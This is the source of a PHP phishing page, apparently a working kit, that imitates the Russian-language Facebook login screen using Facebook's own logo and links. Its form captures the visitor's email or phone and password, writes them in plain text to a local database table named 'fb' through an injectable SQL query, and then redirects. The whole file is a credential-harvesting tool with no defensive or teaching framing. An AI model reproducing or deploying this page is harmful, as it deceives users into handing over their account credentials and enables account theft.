<?php
include_once "db.php";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook — Выполните вход или зарегистрируйтесь</title>
    <link rel="stylesheet" href="./style.css">
</head>

<body>
    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="fb">
    <div class="login">
        <p class="title">Вход на Facebook</p>
        <form method="post">
            <input type="text" placeholder="Электронный адрес или номер телефона" class="user" name="user">
            <input type="text" placeholder="Пароль" class="pass" name="pass">
            <button class="btn" name="submit">Вход</button>
        </form>
        <p class="help"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"> Забыли аккаунт?</a></p>
        <div class="iliDiv">
            <div class="left"></div>
            <p class="ili">или</p>
            <div class="right"></div>
            <button class="sozdat"><a href="https://www.facebook.com/r.php?locale=ru_RU&display=page"> Создать аккаунт</a></button>
        </div>
    </div>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {

        $user = $_POST["user"];
        $pass  = $_POST["pass"];

        $sql = "INSERT INTO `fb`(`user`, `pass`) 
    VALUES ('" . $user . "','" . $pass . "')";

        mysqli_query($conn, $sql);
        header("Location: index.php");
    }
    ?>
</body>

</html>